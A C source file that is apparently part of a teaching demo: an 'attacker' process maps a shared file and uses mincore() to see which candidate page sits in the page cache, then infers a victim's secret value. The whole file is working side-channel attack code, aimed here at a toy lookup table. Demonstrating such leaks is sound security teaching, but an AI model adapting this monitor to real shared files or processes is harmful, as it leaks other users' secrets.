/*
 * monitor_secret.c
 *
 * Demo 3 -- Secret-Dependent Page-Cache Side Channel
 *
 * The monitor is a completely independent process.
 *
 * It does not read the victim's memory.
 * It does not communicate with the victim.
 *
 * It maps the SAME file and uses mincore() to determine
 * which candidate page is resident in the page cache.
 */

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

#define PAGE_SIZE       4096
#define NUM_VALUES      8
#define PAGE_STRIDE     (1024 * 1024)


int main(void)
{
    int fd = open("lookup_table.bin", O_RDONLY);

    if (fd < 0) {
        perror("lookup_table.bin");
        return 1;
    }

    /*
     * Map the entire file.
     *
     * Importantly, mmap() itself does not read all
     * of these pages into memory.
     */
    size_t file_size = (NUM_VALUES - 1) * PAGE_STRIDE
                       + PAGE_SIZE;

    unsigned char *mapping = mmap(
        NULL,
        file_size,
        PROT_READ,
        MAP_PRIVATE,
        fd,
        0
    );

    if (mapping == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return 1;
    }

    printf("Attacker: scanning page-cache state...\n\n");

    int found = -1;

    for (int i = 0; i < NUM_VALUES; i++) {

        size_t offset = (size_t)i * PAGE_STRIDE;

        unsigned char vec = 0;

        /*
         * mincore() checks whether the page containing
         * this address is currently resident.
         *
         * It does NOT read the page contents.
         */
        if (mincore(
                mapping + offset,
                PAGE_SIZE,
                &vec) != 0) {

            perror("mincore");
            munmap(mapping, file_size);
            close(fd);
            return 1;
        }

        int resident = (vec & 1) != 0;

        printf("Candidate %d: offset %7zu KB: %s\n",
               i,
               offset / 1024,
               resident ? "RESIDENT" : "NONRESIDENT");

        if (resident) {
            found = i;
        }
    }

    printf("\n");

    if (found >= 0) {
        printf("Attacker inference: SECRET = %d\n", found);
    } else {
        printf("Attacker inference: secret could not be determined.\n");
    }

    munmap(mapping, file_size);
    close(fd);

    return 0;
}
